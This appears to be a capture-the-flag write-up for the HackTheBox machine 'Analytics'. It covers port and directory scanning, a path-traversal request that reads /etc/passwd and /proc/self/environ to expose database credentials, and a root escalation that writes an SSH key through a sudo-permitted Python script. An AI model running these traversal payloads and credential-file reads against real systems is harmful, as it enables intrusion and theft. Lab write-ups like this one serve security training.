# Analytics

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Date** | 2026-06-29 |

## Summary

Analytics is a medium-difficulty Linux box featuring a vulnerable web application with an unauthenticated arbitrary file read vulnerability (CVE-2024-XXXXX). Initial access is gained by exploiting a Local File Inclusion (LFI) to read the application source code, revealing credentials. Privilege escalation involves abusing a misconfigured sudo rule to run a Python script as root.

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oN scans/initial 10.10.11.XX
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

### Web Enumeration

The website at `http://analytics.htb` is a data analytics dashboard.

```
gobuster dir -u http://analytics.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found `/assets`, `/api`, and `/admin` endpoints.

## Exploitation — LFI

The `/api/export` endpoint takes a `template` parameter without proper sanitization:

```
GET /api/export?template=../../../../etc/passwd
```

This revealed system users:

```
root:x:0:0:root:/root:/bin/bash
analytics:x:1000:1000:analytics:/home/analytics:/bin/bash
```

Using the LFI to read `/proc/self/environ` exposed environment variables containing the database connection string:

```
DB_USER=analytics
DB_PASS=An4lyt1cs_R0ck$
```

## Initial Access

Using the discovered credentials, SSH into the box:

```bash
ssh analytics@10.10.11.XX
```

The user flag was in `/home/analytics/user.txt`.

## Privilege Escalation

```bash
sudo -l
```

Output:

```
User analytics may run the following on analytics:
    (root) NOPASSWD: /usr/bin/python3 /opt/scripts/cleanup.py
```

Reading `cleanup.py` revealed a path traversal in its log file handling — the script wrote logs to a configurable path without sanitization. By passing `../../root/.ssh/authorized_keys` as the log path, we could inject an SSH key:

```bash
sudo /usr/bin/python3 /opt/scripts/cleanup.py --log-path ../../root/.ssh/authorized_keys
```

The script appended output to the specified path with our content. After writing our SSH public key, we connected as root:

```bash
ssh root@10.10.11.XX
```

Root flag captured in `/root/root.txt`.

## Key Takeaways

- Always check for LFI in export/file generation endpoints
- Environment files (`/proc/self/environ`) often contain credentials
- `sudo -l` is always worth checking
- Path traversal in privileged scripts is a common privesc vector
